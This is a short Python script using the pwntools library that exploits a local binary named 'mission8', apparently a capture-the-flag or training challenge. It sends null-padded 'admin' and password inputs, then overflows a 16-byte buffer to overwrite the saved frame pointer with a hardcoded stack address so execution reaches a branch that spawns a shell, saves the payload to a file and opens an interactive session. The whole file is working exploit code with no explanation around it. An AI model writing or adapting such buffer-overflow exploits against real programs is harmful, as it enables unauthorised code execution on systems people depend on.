#!/bin/python
from pwn import *
import os


p = process("./mission8")


# send admin
val = "admin" + "\0" * 51
exploit = val
p.send(val)

# random password
val = "A" + "\0" * 895
exploit += val
p.send(val)

value = str(0xDEADBEEF)

# overvrite the ebp since the read is 0x16 while the buffer is 16
# guess 0xDEADBEEF so its value is in the eax
# skip to the if in the main where it check eax with 0xDEADBEEF
# shell
# profit? 
val = value  + "A" * (16 - len(value)) + p64(0x7fffffffd930 + 0x40)
exploit += val
p.send(val)

with open("writable/exploit.bin", "wb") as f:
	f.write(exploit)

p.interactive()

